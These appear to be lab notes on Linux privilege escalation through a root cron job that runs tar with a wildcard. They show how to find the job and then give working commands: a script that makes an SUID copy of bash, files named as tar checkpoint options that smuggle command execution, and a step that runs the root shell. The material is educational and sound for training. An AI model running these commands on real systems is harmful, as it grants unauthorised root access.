
## Detection

**Linux VM**

1. Check the cron jobs:
   ```bash
   cat /etc/crontab
   ```
2. Note the script `compress.sh`.
3. Check the contents of the script:
   ```bash
   cat /usr/local/bin/compress.sh
   ```
4. Notice the wildcard (`*`) used by `tar`.
![[Pasted image 20240917233541.png]]
## Exploitation

**Linux VM**

1. Create a script to escalate privileges:
   ```bash
   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
   ```
Explained:
- Copy the `/bin/bash` binary to `/tmp/bash`.
- Set the SUID bit on `/tmp/bash` using `chmod +s`. This makes `/tmp/bash` an SUID shell, which any user can execute with root privileges if the script itself is executed by root.

2. Create malicious files:
   ```bash
   touch /home/user/--checkpoint=1
   touch /home/user/--checkpoint-action=exec=sh\ runme.sh
   ```
Explained:

In the context of command line utilities like `tar` and `rsync`, a "checkpoint" is a feature that allows the program to perform specific actions at set intervals during its operation.

After 1 record "interval" is stored/recorded. The action set is to copy a bash sh in the tmp/bash with the suid set. 

3. Wait 1 minute for the script to execute.
4. Run the new Bash binary:
   ```bash
   /tmp/bash -p
   ```

![[Pasted image 20240918001032.png]]

1. Check your user ID:
   ```bash
   id
   ```


Explaination:

The cronjob fires off the compression.sh. that has tar with a ```*```

The tar compresses  everything in /home/user/.  I echo copy bash into tmp/bash that is suid set and stdout to runme.sh. 

runme.sh will cp bash to tmp/bash and set a suid every minute  

I use touch to create a tar checkpoint thats used for logging and command line execution. `tar`, seeing these arguments, doesn't treat them as filenes but as command-line options due to their format.
Tells `tar` to execute `runme.sh` when it reaches the checkpoint.
I then run tmp/bash with suid bit as user. 

